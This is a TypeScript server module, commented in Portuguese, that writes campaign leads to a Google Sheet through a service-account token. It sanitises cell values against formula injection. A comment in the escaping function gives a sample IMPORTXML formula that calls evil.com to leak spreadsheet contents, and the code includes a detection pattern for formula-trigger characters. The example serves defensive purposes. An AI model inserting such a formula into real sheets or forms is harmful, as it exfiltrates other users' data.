import "server-only";

import { JWT } from "google-auth-library";

import { getServerEnv } from "@/lib/env";

/**
 * Gravação de leads na planilha do Google.
 *
 * Falamos com a REST API da Sheets por `fetch` nativo e usamos o
 * `google-auth-library` só para assinar o JWT e trocar por um access token.
 * O pacote `googleapis` faria o mesmo trabalho carregando ~50 MB de clientes
 * gerados para centenas de APIs que este projeto não usa.
 */

export type LeadRow = {
  nome: string;
  cidade: string;
  celular: string;
  consentimento: boolean;
  /** UTM, referrer ou o que o formulário souber sobre a origem. Pode vir vazia. */
  origem?: string;
};

/** Fuso da campanha: o horário na planilha é o horário de Minas. */
const TIME_ZONE = "America/Sao_Paulo";

/** Escopo mínimo: escrever em planilhas. */
const SHEETS_SCOPE = "https://www.googleapis.com/auth/spreadsheets";

/** Teto por célula. Nome e cidade cabem de sobra; corta abuso e lixo colado. */
const MAX_CELL_LENGTH = 500;

/** A API às vezes devolve HTML enorme no erro — logamos só o começo. */
const MAX_ERROR_BODY_LENGTH = 300;

/** Tempo máximo esperando a API antes de desistir. */
const REQUEST_TIMEOUT_MS = 10_000;

/**
 * Caracteres que fazem o Sheets interpretar a célula como fórmula.
 *
 * TAB e CR entram na lista porque alguns importadores os engolem e revelam o
 * caractere seguinte no começo da célula.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Neutraliza injeção de fórmula (CSV/Sheets injection).
 *
 * Sem isto, um “nome” como `=IMPORTXML("http://evil.com","//x")` vira fórmula
 * viva na planilha do cliente: executa quando alguém abre o arquivo e pode
 * vazar o conteúdo das outras células para fora. O apóstrofo à frente é a
 * convenção do Sheets para “isto é texto literal” e não aparece na célula.
 *
 * Também normaliza quebras de linha (uma linha por lead, sempre) e corta o
 * valor em 500 caracteres.
 */
export function escapeSheetValue(value: string): string {
  // A decisão olha o valor cru, só ignorando espaços à esquerda: `"  =1+1"`
  // continua sendo fórmula para o Sheets.
  const withoutLeadingSpaces = value.replace(/^[ \u00A0]+/, "");
  const isFormula = FORMULA_TRIGGERS.test(withoutLeadingSpaces);

  const flattened = value
    .replace(/[\r\n\t]+/g, " ")
    .replace(/\s+/g, " ")
    .trim();

  const escaped = isFormula ? `'${flattened}` : flattened;

  return escaped.slice(0, MAX_CELL_LENGTH);
}

/**
 * Data/hora no fuso de São Paulo em ISO 8601 com offset
 * (`2026-09-05T14:43:12-03:00`).
 *
 * `toISOString()` daria UTC, e uma planilha de campanha lida por gente em Minas
 * com horários três horas adiantados confunde mais do que ajuda.
 */
function saoPauloTimestamp(date: Date = new Date()): string {
  const parts = new Intl.DateTimeFormat("en-CA", {
    timeZone: TIME_ZONE,
    hour12: false,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  }).formatToParts(date);

  const get = (type: Intl.DateTimeFormatPartTypes): string =>
    parts.find((part) => part.type === type)?.value ?? "00";

  // Meia-noite pode sair como "24" dependendo do runtime/ICU.
  const hour = get("hour") === "24" ? "00" : get("hour");
  const local = `${get("year")}-${get("month")}-${get("day")}T${hour}:${get("minute")}:${get("second")}`;

  // O offset sai da diferença entre a hora local e o instante real. Assim vale
  // para qualquer regra de horário de verão que volte a existir.
  const offsetMinutes = Math.round(
    (Date.parse(`${local}Z`) - date.getTime()) / 60_000,
  );
  const sign = offsetMinutes < 0 ? "-" : "+";
  const abs = Math.abs(offsetMinutes);
  const offset = `${sign}${String(Math.floor(abs / 60)).padStart(2, "0")}:${String(abs % 60).padStart(2, "0")}`;

  return `${local}${offset}`;
}

/**
 * Cliente de autenticação, reaproveitado entre requisições.
 *
 * Só o cliente de auth é cacheado (ele guarda o access token e o renova
 * sozinho). Nada específico de requisição mora em escopo de módulo — em
 * serverless isso vazaria dados de um usuário para o próximo.
 */
let cachedAuthClient: JWT | null = null;

function getAuthClient(): JWT {
  if (cachedAuthClient) return cachedAuthClient;

  const env = getServerEnv();

  cachedAuthClient = new JWT({
    email: env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
    key: env.GOOGLE_PRIVATE_KEY,
    scopes: [SHEETS_SCOPE],
  });

  return cachedAuthClient;
}

/**
 * Acrescenta uma linha na aba de leads.
 *
 * Colunas, nesta ordem (os mesmos cabeçalhos descritos no CLAUDE.md):
 * `timestamp | nome | cidade | celular | consentimento | origem`.
 *
 * @throws {Error} sem PII quando a API do Google recusa a gravação.
 */
export async function appendLeadRow(row: LeadRow): Promise<void> {
  const env = getServerEnv();
  const client = getAuthClient();

  const { token } = await client.getAccessToken();
  if (!token) {
    throw new Error(
      "Google Sheets: não foi possível obter access token para a service account.",
    );
  }

  const values = [
    saoPauloTimestamp(),
    row.nome,
    row.cidade,
    row.celular,
    row.consentimento ? "sim" : "não",
    row.origem ?? "",
  ].map(escapeSheetValue);

  // O nome da aba pode ter espaço ou acento; o range vai codificado.
  const range = encodeURIComponent(`${env.GOOGLE_SHEET_TAB}!A:F`);
  const url =
    `https://sheets.googleapis.com/v4/spreadsheets/${encodeURIComponent(env.GOOGLE_SHEET_ID)}` +
    `/values/${range}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ values: [values] }),
    // Sem timeout, uma indisponibilidade do Google seguraria a Server Action
    // até o limite da plataforma e o usuário ficaria olhando o spinner.
    signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
  });

  if (!response.ok) {
    // O corpo do erro do Google descreve a falha (403 de planilha não
    // compartilhada, 404 de aba inexistente) e não ecoa a linha enviada — mas
    // truncamos assim mesmo, por garantia e por higiene de log.
    const body = await response.text().catch(() => "");
    throw new Error(
      `Google Sheets respondeu ${response.status}: ${body.slice(0, MAX_ERROR_BODY_LENGTH)}`,
    );
  }
}
